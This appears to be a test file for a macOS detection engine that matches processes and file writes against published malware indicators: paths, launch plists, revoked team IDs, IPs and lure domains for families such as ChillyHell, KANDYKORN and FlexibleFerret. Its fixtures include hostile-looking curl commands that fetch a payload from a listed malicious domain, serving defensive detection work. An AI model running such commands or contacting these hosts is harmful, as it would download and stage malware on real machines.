import { describe, expect, test } from 'vitest';
import type { CaptureModel, Image } from '../src/model/types';
import { analyze } from '../src/rules/engine';
import { INDICATOR_FAMILIES, INDICATORS, matchArgs, matchPath, matchPlist, matchSigning, matchTeam } from '../src/rules/indicators';
import { apple, capture, img, op, proc } from './synth';

const RULE = 'known-indicator';
const hits = (m: CaptureModel) => analyze(m).queue.flatMap(q => q.findings.filter(f => f.ruleId === RULE).map(f => ({ ...f, procId: q.procId })));
const run = (path: string, o: Partial<Image> = {}): Image => img({ path, args: [path], signingId: null, teamId: null, ...o });
const one = (image: Image, ops: ReturnType<typeof op>[] = []): CaptureModel => capture([proc('100:1', [image], { fileOps: ops })]);

describe('the indicator list', () => {
  test('every entry has a source, a confidence and a severity that its confidence allows', () => {
    expect(INDICATORS.length).toBeGreaterThan(50);
    for (const i of INDICATORS) {
      expect(i.source, i.value).toMatch(/^https:\/\/[^\s]+$/);
      expect(['high', 'medium']).toContain(i.confidence);
      expect(['high', 'med']).toContain(i.severity);
      // High only for what a primary page or Objective-See's exact reproduction states.
      if (i.severity === 'high') expect(i.confidence, `${i.family}: ${i.value}`).toBe('high');
      expect(i.note, i.value).not.toBe('');
    }
    expect(new Set(INDICATORS.map(i => `${i.kind}|${i.value}`)).size).toBe(INDICATORS.length);
    expect(INDICATOR_FAMILIES.map(f => f.id)).toEqual([...new Set(INDICATORS.map(i => i.familyId))]);
  });

  test('no entry is a lab artifact, a hash, a bare generic name or a placeholder', () => {
    for (const i of INDICATORS) {
      expect(i.value, i.value).not.toMatch(/\/Users\/user\/|\/private\/|\[\.\]|hxxp|<|>/);
      if (i.kind === 'path' || i.kind === 'plist') expect(i.value, i.value).toMatch(/[/*]|\.plist$|^\.|\./);
      expect(i.value.length, i.value).toBeGreaterThanOrEqual(6);
      expect(i.value, i.value).not.toMatch(/^[0-9a-f]{32,}$/i);
      if (i.kind === 'team-id') expect(i.value).toMatch(/^[A-Z0-9]{10}$/);
    }
  });

  test('every literal entry finds itself, and a plist is only looked for in a launch folder', () => {
    for (const i of INDICATORS) {
      if (i.value.includes('*')) continue;
      const home = (v: string): string => v.replace(/^~\//, '/Users/alice/').replace(/^\*\*\//, '/Applications/');
      if (i.kind === 'path') expect(matchPath(home(i.value)).map(x => x.value), i.value).toContain(i.value);
      if (i.kind === 'team-id') expect(matchTeam(i.value)?.value).toBe(i.value);
      if (i.kind === 'signing-id') expect(matchSigning(i.value)?.value).toBe(i.value);
      if (i.kind === 'argv') expect(matchArgs(['x', i.value.startsWith('/') ? `http://host${i.value}` : i.value]).map(x => x.indicator.value), i.value).toContain(i.value);
      if (i.kind === 'plist') {
        expect(matchPlist(`/Users/alice/Library/LaunchAgents/${i.value}`).map(x => x.hit.value), i.value).toContain(i.value);
        expect(matchPlist(`/Library/LaunchDaemons/${i.value}`).map(x => x.mitre)).toContain('T1543.004');
        expect(matchPlist(`/tmp/${i.value}`), 'not in a launch folder').toEqual([]);
        expect(matchPlist(`/System/Library/LaunchDaemons/${i.value}`), 'Apple\'s own folder').toEqual([]);
      }
    }
  });
});

describe('matching', () => {
  test('paths: a home folder is any user, case and /private do not matter, a folder entry covers what is in it', () => {
    expect(matchPath('/Users/bob/Library/com.apple.qtop/qtop').map(i => i.family)).toEqual(['ChillyHell']);
    expect(matchPath('/Users/bob/Library/COM.APPLE.QTOP').map(i => i.family)).toEqual(['ChillyHell']);   // the folder itself
    expect(matchPath('/private/tmp/kworker').map(i => i.value)).toEqual(['/tmp/kworker']);
    expect(matchPath('/private/var/tmp/CDrivers/stage2').map(i => i.family)).toEqual(['FlexibleFerret']);
    expect(matchPath('/Users/Shared/.SLD').map(i => i.family)).toEqual(['KANDYKORN']);
    expect(matchPath('/var/folders/ab/cdef123/T/airportpaird').map(i => i.family)).toEqual(['DazzleSpy']);
    expect(matchPath('/Applications/Docs/Hidden Risk Behind New Surge of Bitcoin Price.app/Contents/MacOS/x').map(i => i.family)).toEqual(['HiddenRisk']);
    expect(matchPath('/Applications/Some.app/Contents/MacOS/.macos').map(i => i.family)).toEqual(['Contagious Interview toolchain (BeaverTail, InvisibleFerret, OtterCookie)']);
  });

  test('paths: near misses do not match', () => {
    for (const p of ['/Users/bob/Library/com.apple.qtop2/qtop', '/usr/local/bin/qtop2', '/tmp/kworker2', '/var/tmp/CDrivers.zipx',
      '/Users/Shared/.sldx', '/Users/bob/.n2x/pay', '/Users/bob/Library/Containers/CalendarFocusEXT2/x', '/Applications/Foo.app/Contents/MacOS/macos']) {
      expect(matchPath(p), p).toEqual([]);
    }
  });

  test('words in a command line: a whole word only, never argv[0]', () => {
    expect(matchArgs(['curl', '-A', 'curl1-mac', 'http://x']).map(m => m.indicator.value)).toEqual(['curl1-mac']);
    expect(matchArgs(['curl', 'http://162.0.239.85:3000/task/mac?x=1']).map(m => m.indicator.value).sort()).toEqual(['/task/mac', '162.0.239.85']);
    expect(matchArgs(['curl', 'http://123.254.226.90/x'])).toEqual([]);           // 23.254.226.90 is not inside 123.254.226.90
    expect(matchArgs(['curl', 'http://23.254.226.90.example.org/x'])).toEqual([]); // nor a prefix of a longer name
    expect(matchArgs(['curl', 'https://web071zoom.us/fix']).map(m => m.indicator.family)).toEqual(['BlueNoroff fake-Zoom chain (Huntress; the NimDoor lure)']);
    expect(matchArgs(['curl1-mac'])).toEqual([]);                                  // argv[0] is the program, not an argument
    expect(matchArgs(['curl', 'https://x/task/macros'])).toEqual([]);
    expect(matchArgs(['node', '/Users/bob/dev/task/mac/run.js'])).toEqual([]);     // a URL path only in a URL
    expect(matchArgs(['curl', 'https://x/task/mac/run.js'])).toEqual([]);
    expect(matchArgs(null)).toEqual([]);
  });

  test('launch plists: the Apple-lookalike names, in a user or /Library launch folder', () => {
    expect(matchPlist('/Users/bob/Library/LaunchAgents/com.apple.qtop.plist')[0]!.mitre).toBe('T1543.001');
    expect(matchPlist('/Library/LaunchDaemons/com.apple.qtop.plist')[0]!.mitre).toBe('T1543.004');
    expect(matchPlist('/Library/LaunchAgents/com.Acme.va.plist').map(m => m.hit.family)).toEqual(['GIMMICK']);   // the .va.plist suffix
    expect(matchPlist('/Library/LaunchAgents/com.acme.vault.plist')).toEqual([]);
    // Zoom's own installer writes this name as a system daemon; only the user's folder is the malware's.
    expect(matchPath('/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist')).toEqual([]);
    expect(matchPath('/Users/bob/Library/LaunchAgents/us.zoom.ZoomDaemon.plist').map(i => i.family)).toEqual(['FlexibleFerret']);
    expect(matchPlist('/Library/LaunchAgents/com.apple.softwareupdate.plist').map(m => m.hit.family)).toEqual(['DazzleSpy']);
  });
});

describe('known-indicator', () => {
  test('a program run from a published path is high, with its family, actor and source', () => {
    const f = hits(one(run('/Users/bob/Library/com.apple.qtop/qtop')));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.title).toBe('Matches a published ChillyHell indicator');
    expect(f[0]!.evidence).toBe('ChillyHell: runs /Users/bob/Library/com.apple.qtop/qtop (published indicator ~/Library/com.apple.qtop/)');
    expect(f[0]!.explanation).toContain('UNC4487');
    expect(f[0]!.explanation).toContain('https://objective-see.org/blog/blog_0x84.html');
    expect(f[0]!.explanation).toContain('not a behaviour the capture shows');
    expect(f[0]!.mitre).toEqual([]);
  });

  test('a revoked team ID or a signing ID is enough, whatever the file is called', () => {
    expect(hits(one(run('/tmp/anything', { teamId: 'R868N47FV5', signingId: 'a.out' })))[0]!.evidence).toContain('signed by team R868N47FV5');
    expect(hits(one(run('/tmp/x', { signingId: 'HLOADER-5555494485b460f1e2343dffaef9b94d01136320' })))[0]!.title).toBe('Matches a published KANDYKORN indicator');
    expect(hits(one(run('/tmp/x', { teamId: '2289F6V4BN' })))[0]!.title).toBe('Matches a published Evasive Panda macOS downloader (Monlam watering hole, 2024) indicator');
  });

  test('a file it wrote counts, a plist cites its persistence technique, and a folder is one line however many files', () => {
    const m = one(apple('/bin/cp', ['cp', 'a', 'b']), [
      op('create', '/Users/bob/Library/LaunchAgents/com.apple.qtop.plist'),
      op('create', '/Users/bob/Library/com.apple.qtop/qtop', 3), op('create', '/Users/bob/Library/com.apple.qtop/log', 4),
    ]);
    const f = hits(m);
    expect(f).toHaveLength(1);
    expect(f[0]!.mitre).toEqual(['T1543.001']);
    expect(f[0]!.evidence.match(/ChillyHell/g)).toHaveLength(2);   // the plist and the folder: one line each
    // A rename counts through its destination.
    const moved = hits(one(apple('/bin/mv', ['mv', 'a', 'b']), [op('rename', '/tmp/stage', 2, '/Users/Shared/.pd')]));
    expect(moved[0]!.evidence).toContain('moved into place /Users/Shared/.pd');
  });

  test('a command line names a published word', () => {
    const f = hits(one(apple('/usr/bin/curl', ['curl', '-s', '-A', 'curl1-mac', '-o', '/tmp/icloud_helper', 'https://web071zoom.us/fix/audio-fv/1'])));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.evidence).toContain('names curl1-mac in its command line');
  });

  test('medium-confidence entries stay med and say so; the highest of several decides', () => {
    const med = hits(one(run('/var/tmp/macpatch.sh')));
    expect(med[0]!.severity).toBe('med');
    expect(med[0]!.evidence).toContain('medium confidence');
    const mixed = hits(one(run('/var/tmp/macpatch.sh'), [op('create', '/Users/Shared/.pd')]));
    expect(mixed[0]!.severity).toBe('high');
    expect(mixed[0]!.title).toBe('Matches published indicators of FlexibleFerret, RustBucket');
  });

  test('a finding marks its process as the source of a flagged chain', () => {
    const parent = proc('100:1', [run('/Users/bob/Library/com.apple.qtop/qtop')]);
    const child = proc('200:1', [apple('/usr/bin/whoami', ['whoami'])], { originalParent: '100:1' });
    const a = analyze(capture([parent, child]));
    expect(a.queue.find(q => q.procId === '200:1')?.inFlaggedChain).toBe(true);
  });

  test('ordinary software is not matched', () => {
    const m = capture([
      proc('1:1', [run('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', { teamId: 'EQHXZ8M8AV', signingId: 'com.google.Chrome' })]),
      proc('2:1', [apple('/usr/bin/curl', ['curl', '-sL', '-o', '/tmp/x.tgz', 'https://github.com/org/repo/releases/download/v1/x.tgz'])],
        { fileOps: [op('create', '/tmp/x.tgz'), op('create', '/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist'), op('create', '/Users/bob/Library/LaunchAgents/com.google.keystone.agent.plist'), op('create', '/Users/bob/.local/share/app/x')] }),
      proc('3:1', [run('/usr/local/bin/node', { args: ['node', '/Users/bob/dev/task/mac/run.js'] })]),
      proc('4:1', [run('/Users/bob/.vscode/extensions/x/bin/server')]),
    ]);
    expect(hits(m)).toEqual([]);
  });

  test('a process with no program path or no arguments is skipped, not an error', () => {
    expect(hits(capture([proc('1:1', [img({ path: null, args: null, signingId: null })])]))).toEqual([]);
    expect(hits(capture([proc('1:1', [], { fileOps: [op('write', '/Users/Shared/.pd')] })]))).toEqual([]);   // a write is not a drop
  });
});
